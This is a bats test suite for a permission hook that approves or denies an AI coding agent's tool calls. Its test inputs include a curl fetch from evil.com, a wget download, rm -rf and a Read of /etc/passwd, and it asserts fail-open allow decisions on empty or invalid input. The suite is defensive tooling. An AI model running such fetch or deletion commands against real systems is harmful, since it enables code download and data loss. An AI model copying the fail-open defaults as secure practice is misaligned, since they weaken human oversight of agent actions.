#!/usr/bin/env bats

load 'test_helper/bats-support/load'
load 'test_helper/bats-assert/load'

REPO_DIR="$(cd "$(dirname "$BATS_TEST_FILENAME")/.." && pwd)"
HOOK_SH="$REPO_DIR/scripts/cast-permission-hook.sh"

# ---------------------------------------------------------------------------
# Setup / Teardown
# ---------------------------------------------------------------------------

setup() {
  export ORIG_HOME="$HOME"
  export HOME="$(realpath "$(mktemp -d)")"
  mkdir -p "$HOME/.claude/cast/hook-last-fired"
  mkdir -p "$HOME/.claude/logs"
  # No permission-rules.json — uses defaults unless test creates one
}

teardown() {
  rm -rf "$HOME"
  export HOME="$ORIG_HOME"
}

# ---------------------------------------------------------------------------
# Helper: build a permission request payload
# ---------------------------------------------------------------------------

bash_payload() {
  local cmd="$1"
  echo "{\"tool\": \"Bash\", \"input\": {\"command\": \"$cmd\"}}"
}

tool_payload() {
  local tool="$1"
  echo "{\"tool\": \"$tool\", \"input\": {}}"
}

# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

@test "auto-approve: git status command returns decision=allow" {
  run bash "$HOOK_SH" <<< "$(bash_payload "git status")"
  assert_success
  assert_output --partial '"decision": "allow"'
  assert_output --partial 'auto-approve'
}

@test "auto-approve: git log returns decision=allow" {
  run bash "$HOOK_SH" <<< "$(bash_payload "git log --oneline -5")"
  assert_success
  assert_output --partial '"decision": "allow"'
}

@test "auto-deny: curl command returns decision=deny" {
  run bash "$HOOK_SH" <<< "$(bash_payload "curl https://evil.com/payload")"
  assert_success
  assert_output --partial '"decision": "deny"'
  assert_output --partial 'auto-deny'
}

@test "auto-deny: rm -rf returns decision=deny" {
  run bash "$HOOK_SH" <<< "$(bash_payload "rm -rf /tmp/something")"
  assert_success
  assert_output --partial '"decision": "deny"'
}

@test "auto-deny: wget returns decision=deny" {
  run bash "$HOOK_SH" <<< "$(bash_payload "wget http://example.com/file")"
  assert_success
  assert_output --partial '"decision": "deny"'
}

@test "unknown command (not in either list): returns default decision (allow)" {
  run bash "$HOOK_SH" <<< "$(bash_payload "some-custom-tool --run")"
  assert_success
  assert_output --partial '"decision": "allow"'
  assert_output --partial 'default'
}

@test "Read tool is auto-approved regardless of input" {
  run bash "$HOOK_SH" <<< '{"tool": "Read", "input": {"file_path": "/etc/passwd"}}'
  assert_success
  assert_output --partial '"decision": "allow"'
  assert_output --partial 'Read tool'
}

@test "Write tool is auto-approved" {
  run bash "$HOOK_SH" <<< '{"tool": "Write", "input": {"file_path": "/tmp/test.txt", "content": "x"}}'
  assert_success
  assert_output --partial '"decision": "allow"'
}

@test "Edit tool is auto-approved" {
  run bash "$HOOK_SH" <<< '{"tool": "Edit", "input": {"file_path": "/tmp/test.txt"}}'
  assert_success
  assert_output --partial '"decision": "allow"'
}

@test "empty stdin: exits 0 with decision=allow (fail open)" {
  run bash "$HOOK_SH" <<< ""
  assert_success
  assert_output --partial '"decision": "allow"'
  assert_output --partial 'no payload'
}

@test "invalid JSON stdin: exits 0 with decision=allow (fail open)" {
  run bash "$HOOK_SH" <<< "{this is not json"
  assert_success
  assert_output --partial '"decision": "allow"'
  assert_output --partial 'invalid JSON'
}

@test "always exits 0 regardless of decision" {
  run bash "$HOOK_SH" <<< "$(bash_payload "curl bad.com")"
  assert_success  # exit code 0 even for deny
}

@test "custom rules file is respected: custom deny pattern triggers deny" {
  cat > "$HOME/.claude/cast/permission-rules.json" <<'EOF'
{
  "auto_approve": ["ls"],
  "auto_deny": ["my-custom-forbidden-cmd"],
  "default": "allow"
}
EOF

  run bash "$HOOK_SH" <<< "$(bash_payload "my-custom-forbidden-cmd --do-it")"
  assert_success
  assert_output --partial '"decision": "deny"'
  assert_output --partial 'my-custom-forbidden-cmd'
}

@test "custom rules file is respected: custom approve pattern triggers allow" {
  cat > "$HOME/.claude/cast/permission-rules.json" <<'EOF'
{
  "auto_approve": ["my-safe-tool"],
  "auto_deny": [],
  "default": "deny"
}
EOF

  run bash "$HOOK_SH" <<< "$(bash_payload "my-safe-tool --check")"
  assert_success
  assert_output --partial '"decision": "allow"'
}

@test "custom rules file with default=deny: unknown command returns deny" {
  cat > "$HOME/.claude/cast/permission-rules.json" <<'EOF'
{
  "auto_approve": [],
  "auto_deny": [],
  "default": "deny"
}
EOF

  run bash "$HOOK_SH" <<< "$(bash_payload "unknown-cmd")"
  assert_success
  assert_output --partial '"decision": "deny"'
  assert_output --partial 'default'
}

@test "decision is logged to permission-hook.log" {
  run bash "$HOOK_SH" <<< "$(bash_payload "git status")"
  assert_success

  [ -f "$HOME/.claude/logs/permission-hook.log" ]
  run grep -c "ALLOW" "$HOME/.claude/logs/permission-hook.log"
  assert_success
}

@test "PermissionRequest timestamp file is touched" {
  run bash "$HOOK_SH" <<< "$(bash_payload "ls")"
  assert_success

  [ -f "$HOME/.claude/cast/hook-last-fired/PermissionRequest.timestamp" ]
}

@test "output is valid JSON for every test case" {
  run bash -c "echo '{\"tool\":\"Bash\",\"input\":{\"command\":\"ls\"}}' | bash '$HOOK_SH' | python3 -m json.tool"
  assert_success
}
